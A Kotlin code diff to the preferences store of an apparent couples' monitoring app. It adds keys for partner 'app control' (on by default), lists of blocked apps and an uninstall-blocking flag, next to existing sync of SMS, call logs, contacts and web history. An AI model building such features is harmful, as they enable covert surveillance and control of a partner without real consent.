@@ -40,14 +40,20 @@ class SessionRepository(context: Context) {
         val profileShareLiveAudio = booleanPreferencesKey("profile_share_live_audio")
         val profileShareScreenView = booleanPreferencesKey("profile_share_screen_view")
         val profileShareMedia = booleanPreferencesKey("profile_share_media")
+        val profileShareAppControl = booleanPreferencesKey("profile_share_app_control")
         val cachedPartnerJson = stringPreferencesKey("cached_partner_json")
+
         val latestContactsHash = stringPreferencesKey("latest_contacts_hash")
         val latestWebHistoryHash = stringPreferencesKey("latest_webhistory_hash")
         val latestSmsHash = stringPreferencesKey("latest_sms_hash")
         val latestCallLogHash = stringPreferencesKey("latest_calllog_hash")
         val latestYoutubeHash = stringPreferencesKey("latest_youtube_hash")
         val latestMediaHash = stringPreferencesKey("latest_media_hash")
+        val latestAppsHash = stringPreferencesKey("latest_apps_hash")
+        val blockedPackages = stringPreferencesKey("blocked_packages") // Comma separated
+        val uninstallBlocked = booleanPreferencesKey("uninstall_blocked")
     }
+
 
     val sessionFlow: Flow<Session?> = ds.data.map { prefs ->
         val c = prefs[Keys.coupleId]
@@ -85,10 +91,15 @@ class SessionRepository(context: Context) {
             shareLiveAudio = prefs[Keys.profileShareLiveAudio] == true,
             shareScreenView = prefs[Keys.profileShareScreenView] == true,
             shareMedia = prefs[Keys.profileShareMedia] == true,
+            shareAppControl = prefs[Keys.profileShareAppControl] != false, // Default true
         )
+
     }
 
+
     suspend fun getSession(): Session? = sessionFlow.first()
+
+
 
     suspend fun isProfileCompleted(): Boolean = profileCompletedFlow.first()
 
@@ -120,7 +131,9 @@ class SessionRepository(context: Context) {
         shareLiveAudio: Boolean,
         shareScreenView: Boolean,
         shareMedia: Boolean,
+        shareAppControl: Boolean,
         markCompleted: Boolean,
+
     ) {
         ds.edit { prefs ->
             prefs[Keys.profileDisplayName] = displayName
@@ -138,7 +151,9 @@ class SessionRepository(context: Context) {
             prefs[Keys.profileShareLiveAudio] = shareLiveAudio
             prefs[Keys.profileShareScreenView] = shareScreenView
             prefs[Keys.profileShareMedia] = shareMedia
+            prefs[Keys.profileShareAppControl] = shareAppControl
             if (markCompleted) {
+
                 prefs[Keys.profileCompleted] = true
             }
         }
@@ -188,6 +203,29 @@ class SessionRepository(context: Context) {
         ds.edit { it[Keys.latestMediaHash] = hash }
     }
 
+    suspend fun getLatestAppsHash(): String? = ds.data.map { it[Keys.latestAppsHash] }.first()
+
+    suspend fun saveLatestAppsHash(hash: String) {
+        ds.edit { it[Keys.latestAppsHash] = hash }
+    }
+
+    val blockedPackagesFlow: Flow<Set<String>> = ds.data.map { prefs ->
+        prefs[Keys.blockedPackages]?.split(",")?.filter { it.isNotBlank() }?.toSet() ?: emptySet()
+    }
+
+    suspend fun getBlockedPackages(): Set<String> = blockedPackagesFlow.first()
+
+    suspend fun saveBlockedPackages(packages: Set<String>) {
+        ds.edit { it[Keys.blockedPackages] = packages.joinToString(",") }
+    }
+
+    val uninstallBlockedFlow: Flow<Boolean> = ds.data.map { it[Keys.uninstallBlocked] == true }
+
+    suspend fun saveUninstallBlocked(value: Boolean) {
+        ds.edit { it[Keys.uninstallBlocked] = value }
+    }
+
+
     data class CachedProfile(
         val displayName: String,
         val shareAll: Boolean,
@@ -204,5 +242,7 @@ class SessionRepository(context: Context) {
         val shareLiveAudio: Boolean,
         val shareScreenView: Boolean,
         val shareMedia: Boolean,
+        val shareAppControl: Boolean,
     )
+
 }
